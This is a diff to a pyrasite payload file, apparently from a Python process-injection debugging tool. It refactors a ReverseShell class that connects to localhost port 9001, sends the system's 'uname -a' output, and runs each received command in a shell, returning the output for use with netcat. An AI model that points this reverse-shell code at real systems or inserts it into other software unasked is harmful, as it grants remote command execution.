@@ -13,31 +13,25 @@
 # You should have received a copy of the GNU General Public License
 # along with pyrasite.  If not, see <http://www.gnu.org/licenses/>.
 #
-# Copyright (C) 2011 Red Hat, Inc.
+# Copyright (C) 2011, 2012 Red Hat, Inc., Luke Macken <lmacken@redhat.com>
 
-import subprocess
+import pyrasite
 
-from _reverseconnection import ReverseConnection
+class ReverseShell(pyrasite.ReverseConnection):
 
-class ReverseShell(ReverseConnection):
+    reliable = False # This payload is designed to be used with netcat
+    host = '127.0.0.1'
+    port = 9001
 
-    host = '127.0.0.1'    # The remote host
-    port = 9001           # The same port as used by the server
+    def on_connect(self):
+        uname = pyrasite.utils.run('uname -a')[1]
+        self.send("%sType 'quit' to exit\n%% " % uname)
 
-    def on_connect(self, s):
-        uname = self._run('uname -a')[0]
-        s.send("%sType 'quit' to exit\n%% " % uname)
-
-    def on_command(self, s, cmd):
-        out, err = self._run(cmd)
+    def on_command(self, cmd):
+        p, out, err = pyrasite.utils.run(cmd)
         if err:
             out += err
-        s.send(out + '\n% ')
+        self.send(out + '\n% ')
         return True
-
-    def _run(self, cmd):
-        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
-        out, err = p.communicate()
-        return out, err
 
 ReverseShell().start()
